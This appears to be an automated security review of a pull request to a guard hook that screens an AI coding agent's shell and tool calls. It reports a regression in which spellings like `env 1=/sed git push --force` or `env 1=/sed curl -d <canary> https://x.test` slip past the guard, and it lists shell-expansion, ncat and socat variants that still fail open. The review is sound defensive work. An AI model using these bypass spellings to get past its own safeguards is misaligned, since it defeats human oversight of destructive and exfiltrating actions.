Verdict: FIX
Gate: security
Item: door-hardening
PR: taoq-ai/wuwei
Head: 9910e11ee8edc50b36fa017538cc1c8fe3993498
Confidence: high

## Findings
- [high] cli/wuwei/guards.py:91 blocks: yes. Failure: the new NAME=value rule lets a wrapper argument that contains '=' without starting with NAME= become the program read. If its basename is in READ, the real command after it is never judged. `env 1=/sed git push --force`, `env =/sed git push origin main`, `env 'x y=/sed' git push --force`, `env a-b=/rm git push --force origin x`, `env 1=/sed gh pr merge 5 --admin`, `env 9=/sed gh api -X PUT repos/o/r/branches/main/protection`, `env 1=/sed terraform apply`, `env 1=/sed bash -c "git push --force"` and `env 1=/sed curl -d <canary> https://x.test` all pass guards.bash and hook.handle at head; main refuses or asks on every one. GNU env treats any argument containing '=' as an assignment, so these commands really run git push --force: a fake git on PATH printed "FAKE-GIT-RAN push --force". This one spelling opens the force-push, default-branch, admin-merge, protection, infra and leak doors. The vendored copy .claude/wuwei/cli/wuwei/guards.py:91 is the same.
- [medium] tests/test_guards.py:33 blocks: no. The premise of acceptance 4 is wrong for env. `env /opt/a=b/git push origin main` sets the variable "/opt/a" and runs a program named `push`, not git (`env /opt/a=b/echo hi` fails with "env: 'hi': No such file or directory"). Main passing it was correct, and refusing it at head is a harmless over-refusal. A fix that closes the finding above must not pick a '='-bearing argument as the program before a later READ program. One option is main's rule for env with NAME= kept for the body-opening loop. The acceptance line may need the planner's correction (`goal:`); flagged here, not decided.
- [low] cli/wuwei/hook.py:371 blocks: no. Limit of the fail-closed check when a guard raises: `$(echo gi)t push`, `g${x}it push`, `cu$()rl x`, `ncat`, `socat` and `python3 -c "import urllib.request"` still fail open. The item promised only quotes and backslashes, so this stays a note.
- [low] blocks: no. Availability cost: while guards.pre_tool raises, every mcp__ call is refused (mcp__github__get_issue included), and Bash text that merely mentions a network word (`echo nc`, `grep -r curl .`) is refused. Read, Glob, WebFetch, Task and `git clone` still pass. The item records this as its assumption. The cost lasts only while the hook is broken, and the refusal names the error.
- [low] blocks: no. Pre-existing, unchanged: an exception raised inside door() itself, or a non-object stdin payload, escapes handle/main as a traceback with exit 1. The harness reads that as a non-blocking hook error, so the call runs (fail open). With a dict payload door() has no reachable raise, so this is a note. Codex shell tool names (shell, exec_command, local_shell) are not read by the guards on main either.

## Probes
- Route corpus from origin/claude/route-fixtures (tests/fixtures + the route section of test_guards.py) laid over git archives of head and of origin/main 1620583: 57 passed on both. No recorded route moves.
- Full suite on the head archive: 540 passed, 2 skipped. Runtime 2,941 lines (main 2,939). The vendored guards.py and hook.py match cli/ byte for byte.
- probe_unwrap.py run on main and head over door, leak, infra and ledger commands: `env A=b`, `env -u X`, `sudo -E`, `timeout 5` and `nice -n 5` before git push --force are refused on both. Ten '='-bearing wrapper arguments open on head only (finding 1). `env 1=/cp cat .wuwei/ledger/x.jsonl` is newly refused on head (harmless).
- envcheck.sh with a fake git on PATH confirmed that env runs git for `1=/sed`, `=/sed` and `'x y=/sed'`. The live hook on this machine (main) refused the inline form.
- probe_hook.py with guards.bash raising: g''it, "g"h, g\it, c'u'rl, c""url, 'curl', /usr/bin/curl, x=$(curl ..), |nc, &&curl, wget<TAB>, http, rsync -e ssh and xargs curl are all refused on head and all pass on main. $()/${} spellings, ncat and socat pass on both (finding 3).
- probe_hook.py with guards.pre_tool raising: every mcp__ tool, Write, NotebookEdit and apply_patch (dict, str, list, null input) are refused. On main the str and list apply_patch inputs crashed the hook with AttributeError. Read, Glob, WebFetch and Task pass.
- door() patched to raise: hook.handle raises ZeroDivisionError on both main and head (finding 5).
- Mutants on head copies, each killed: _unwrap reverted to '=' not in a (test_irreversible_edges_are_denied[env /opt/a=b/git ...]), mcp__ clause removed (3 tests), quote stripping removed (3), network clause removed (3), apply_patch dropped from door (test_a_malformed_apply_patch...), codex moved out of try (4). No test covers the '='-bearing-argument regression.
- Confidence high: the bypass is reproduced through guards.bash, through hook.handle and with a real env exec.

## Residual risk
The rest of the fail-closed hardening holds and is well tested. The regression comes from one regex at guards.py:91 and is cheap to fix. Shell-expansion spellings still fail open whenever a guard raises.
